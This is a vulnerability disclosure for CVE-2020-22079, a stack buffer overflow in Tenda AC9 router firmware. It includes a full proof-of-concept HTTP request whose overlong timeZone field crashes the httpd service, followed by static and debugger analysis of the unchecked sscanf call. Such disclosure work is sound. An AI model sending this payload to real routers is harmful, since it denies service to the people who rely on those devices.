# CVE-2020-22079

## 1、Basci information

vendor: Tenda

product: AC9 and so on

version: V1.0V15.03.05.19（6318）、V3.0V15.03.06.42_multi and so on

Vulnerability type: buffer overflow

Vulnerability Effect: Denial of Service

## 2、Principle description of vulnerability technology

Affected Vulnerability Components:
- File name: bin/httpd
- function: system management ->wifi settings

## 3、Vulnerability value

Stable reproducibility: Yes

exploit conditions：
- attack vector type: neighboring network
- Stability of exploit: every attack can be successful
- Whether the product is configured by default: there are loopholes in the functional components that are enabled at the factory

## 4、PoC

```
POST /goform/fast_setting_wifi_set HTTP/1.1
Host: 192.168.56.103
Accept: text/plain, */*; q=0.01
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36
X-Requested-With: XMLHttpRequest
Referer: http://192.168.56.103/main.html
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6
Cookie: password=uhotgb
Connection: close
Content-Length: 836

ssid=1&timeZone=aaaa::aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
```

## 5、Vulnerability principle

### 5.1 static analysis

As shown in the following figure, because the passed-in `timeZone` parameter is not checked, the 142-line `sscanf` assigns the maliciously injected super-long data to the `v9` variable, which causes the buffer overflow in the later operation of the program, and finally causes the effect of denial of service

![](imgs/stack1/code.png)

### 5.2 dynamic analysis

Use IDA for dynamic debugging, which is the original assembly code corresponding to the program. Before the execution of `sscanf`, the value at `[R11,#var_2C]` is still normal

![](imgs/stakc1/debug.PNG)

When `sscanf` is executed, the value at `[R11,#var_2C]` becomes a maliciously injected value (ASCII code value of A)

![](imgs/stack1/debug1.PNG)

Looking back at the disassembly code given by IDA, the PoC given above makes the return value of `sscanf` of 142 lines 2, which causes the program to crash at 145

![](imgs/stack1/code.PNG)

The reason for the crash is that `[R11,#var_2C]` is directly assigned to R3 register at address `0x00067360`, and the subsequent LDRB instruction causes the program to crash

![](imgs/stack1/debug2.PNG)

Dynamic debugging crash site

![](imgs/stack1/debug3.PNG)

![](imgs/stack1/debug4.PNG)

## 6、CNVD reference 

[CNVD reference](https://www.cnvd.org.cn/flaw/show/CNVD-2021-17400)